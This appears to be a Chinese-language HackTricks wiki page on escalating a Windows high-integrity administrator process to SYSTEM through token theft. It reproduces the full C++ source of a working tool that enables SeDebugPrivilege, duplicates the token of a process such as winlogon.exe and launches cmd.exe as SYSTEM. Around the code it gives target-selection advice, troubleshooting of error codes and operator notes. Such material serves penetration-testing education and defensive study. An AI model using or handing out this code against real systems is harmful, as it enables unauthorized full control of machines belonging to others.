# 从 High 提权到 System

{{#include ../../banners/hacktricks-training.md}}

本页面介绍如何通过**打开一个未受保护的 SYSTEM 进程、复制其 token，并使用该 token 创建子进程**，以**手动**方式将**高完整性管理员进程**提升为 **`NT AUTHORITY\SYSTEM`**。

如果你只有 **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`**，但**无法打开合适的 SYSTEM 进程**，那么 **Potato / named-pipe** 路径通常更可靠：

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

如果你需要的不仅是 `SYSTEM`，而是一个**拥有尽可能多权限的 SYSTEM token**，还可以查看：

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## 快速检查

在尝试窃取 token 之前，先快速验证当前上下文：
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
实用注意事项：

- **High Integrity** admin token 通常足以**启用 `SeDebugPrivilege`**，并打开许多未受保护的 SYSTEM 进程。
- **`CreateProcessWithTokenW` 要求调用方具有 `SeImpersonatePrivilege`**。如果该 API 失败并返回 `1314`，且你已经复制了 SYSTEM primary token，请改用 `CreateProcessAsUserW`。
- 在现代 Windows 上，**`lsass.exe` 通常不是理想目标**，因为 **LSA protection / PPL** 会阻止访问，即使管理员拥有 `SeDebugPrivilege` 也一样。优先选择 **`winlogon.exe`**、**`wininit.exe`**、**`services.exe`**，或较早启动且以 SYSTEM 身份运行的 **`svchost.exe`**。
- 并非每个 SYSTEM 进程都具有同样有用的 token。如果你获得了 SYSTEM，但发现缺少某些 privileges，请尝试其他 SYSTEM 进程，而不要直接认为该 technique 已失效。

## 仔细选择 PID

要可靠地实现这一点，最简单的方法是**选择一个其 DACL 确实允许 Administrators 查询进程并复制其 token 的 SYSTEM 进程**。

优先测试以下候选项：

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- 一些以 SYSTEM 身份运行的早期 `svchost.exe` 实例

默认避免：

- 在启用 **RunAsPPL / LSA protection** 的主机上使用 `lsass.exe`
- 即使启用 `SeDebugPrivilege` 后仍返回 `Access denied` 的受保护进程或安全敏感进程

你可以使用以 elevated 权限运行的 **Process Explorer** 或 **Process Hacker** 检查候选进程及其 token/ACL。

### Code

以下代码来自[这篇 access-token 文章](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)。它接受一个**进程 ID 作为参数**，并以该进程**用户的身份**启动 command shell。<sup>[[3]](#references)</sup>\
在 High Integrity 进程中运行时，你可以**指定一个以 System 身份运行的进程的 PID**（例如 `winlogon`、`wininit`），并以 SYSTEM 身份执行 `cmd.exe`。<sup>[[3]](#references)</sup>
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## 有用的 API / access-right 注意事项

该示例使用 `MAXIMUM_ALLOWED`，但对于实际操作，记住其中涉及的最小权限通常很有用：

- `OpenProcessToken()` 只要求 **process handle** 在打开时具有 **`PROCESS_QUERY_LIMITED_INFORMATION`**。
- 要使用 `CreateProcessWithTokenW()`，**primary token handle** 必须具有 **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**。<sup>[[1]](#references)</sup>
- `DuplicateTokenEx()` 必须创建 **primary token**（`TokenPrimary`），而不能只是 impersonation token。
- 如果你已经 impersonate 了 SYSTEM，但 `CreateProcessWithTokenW()` 仍因 `1314` 失败，请改用 `CreateProcessAsUserW()`。

这意味着，使用 `PROCESS_ALL_ACCESS` 打开目标进程通常是不必要的，而且比仅请求查询 token 所需的权限更容易产生噪声。

## 错误

有时你可能会尝试 impersonate System，但操作不会成功，并显示类似以下内容的输出：
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
这意味着，即使你运行在 High Integrity level 下，**你对目标进程/token 仍没有足够的权限**。\
让我们使用 **Process Explorer** 检查当前 Administrator 对 `svchost.exe` 进程的权限（你也可以使用 **Process Hacker**）：

1. 选择一个 `svchost.exe` 进程
2. 右键 --> Properties
3. 在 "Security" Tab 中，点击右下角的 "Permissions" 按钮
4. 点击 "Advanced"
5. 选择 "Administrators"，然后点击 "Edit"
6. 点击 "Show advanced permissions"

![Code - Error: 6. 点击 "Show advanced permissions"](<../../images/image (437).png>)

上图包含 "Administrators" 对所选进程拥有的全部权限（如你在 `svchost.exe` 的情况下所看到的，它们只有 "Query" 权限）。

查看 "Administrators" 对 `winlogon.exe` 拥有的权限：

![Code - Error: 查看 "Administrators" 对 winlogon.exe 拥有的权限](<../../images/image (1102).png>)

在该进程中，"Administrators" 可以 "Read Memory" 和 "Read Permissions"，这可能允许 Administrators impersonate 该进程使用的 token。

### 常见失败原因

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**：进程 DACL 阻止了你，或者目标是 **protected/PPL**。选择其他 SYSTEM 进程。
- **`DuplicateTokenEx()` -> `5 (Access denied)`**：你的 token handle 在打开时没有足够的权限，或者目标 token 的 DACL 阻止了 duplication。
- **`CreateProcessWithTokenW()` -> `1314`**：调用者当前没有启用 **`SeImpersonatePrivilege`**。先尝试启用它，或者使用 duplicated primary token 调用 `CreateProcessAsUserW()`。
- 在之前的失败之后，**`CreateProcessWithTokenW()` -> `1326`**：这通常仅表示之前的 token duplication/impersonation 步骤失败，因此没有可用的 primary token 来启动 child process。

## Operator notes

- 当你已经是 **local admin + high integrity**，并且只是想通过快速、手动的方式提权到 SYSTEM，而不启动 service 或构造 named-pipe coercion chain 时，这项技术非常实用。
- 在经过 hardening 的 Windows 11 / Server 环境中，**LSA protection 越来越常见**，因此假设 `lsass.exe` 始终可读的 workflow 不够可靠。**`winlogon.exe` / `wininit.exe` / `services.exe` 通常是更好的首选目标**。<sup>[[2]](#references)</sup>
- 如果你进入的是 **service account** context，而不是已提升权限的 admin desktop，那么 **Potato family** 通常比本页面介绍的方法更合适。



## References

- [1] [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [2] [SensePost: 利用 Windows tokens compromise Active Directory，而无需接触 LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
- [3] [理解并滥用 Process Tokens —— 第二部分](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962)
{{#include ../../banners/hacktricks-training.md}}
